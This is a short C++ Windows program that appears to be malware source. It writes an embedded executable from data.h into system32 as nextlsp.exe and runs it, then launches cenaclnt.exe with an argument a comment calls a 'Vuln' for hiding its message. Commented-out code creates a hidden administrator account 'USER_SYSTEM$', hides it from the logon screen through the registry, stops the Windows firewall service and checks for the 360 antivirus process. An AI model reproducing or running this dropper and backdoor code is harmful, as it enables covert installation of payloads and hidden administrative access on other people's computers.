//#pragma comment(linker,"/Zm100")
//Set to the project C/C++










































#include "windows.h"
#include <cstdio>
#include "data.h"
#include <time.h>
int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmd,int nShow)
{
	//ShowWindow(GetConsoleWindow(),SW_HIDE);
	//bool fnd=GetProcessidFromName("360tray.exe")==0?false:true;
	//if(!fnd)
	/*{
		system("cmd /c net user USER_SYSTEM$ USER_SYSTEM$ /add");
		system("cmd /c net localgroup administrators USER_SYSTEM$ /add");
		system("cmd /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v USER_SYSTEM$ /t REG_DWORD /d 0 /f");
		system("cmd /c reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v forceguest /t REG_DWORD /d 0 /f");		
		system("cmd /c net stop SharedAccess");
		//system("cmd /c sc config tlntsvr start= auto");
		//system("cmd /c net start tlntsvr");
	}*/
	
	if(GetFileAttributes("C:\\WINDOWS\\system32\\nextlsp.exe") == 0xFFFFFFFF)
	{
		FILE*fp=fopen("C:\\WINDOWS\\system32\\nextlsp.exe","wb");
		fwrite(data,sizeof(data),1,fp);
		fclose(fp);
	}
	Sleep(50);
	//WinExec("c:\\windows\\system32\\rundll32.exe C:\\WINDOWS\\MInst.dll,TF",SW_SHOW);
	WinExec("C:\\WINDOWS\\system32\\nextlsp.exe",SW_SHOW);
	
	char*str=new char[99];
	/*strcpy(str,"c:\\windows\\temp\\cenaclnt-");
	srand((unsigned)time(NULL));
	int val=rand()%(65530 + 1 - 1) + 1;
	char*vs=new char[8];
	itoa(val,vs,8);
	strcat(str,vs);strcat(str,".exe");
	CopyFile("c:\\windows\\system32\\cenaclnt.exe",str,TRUE);*/
	//Vuln: replace the PARAM -f with -nothing, will not show the message
	strcpy(str,"c:\\windows\\system32\\cenaclnt.exe");
	strcat(str," -nothing!");
	WinExec(str,SW_SHOW);
	

	return 0;
}
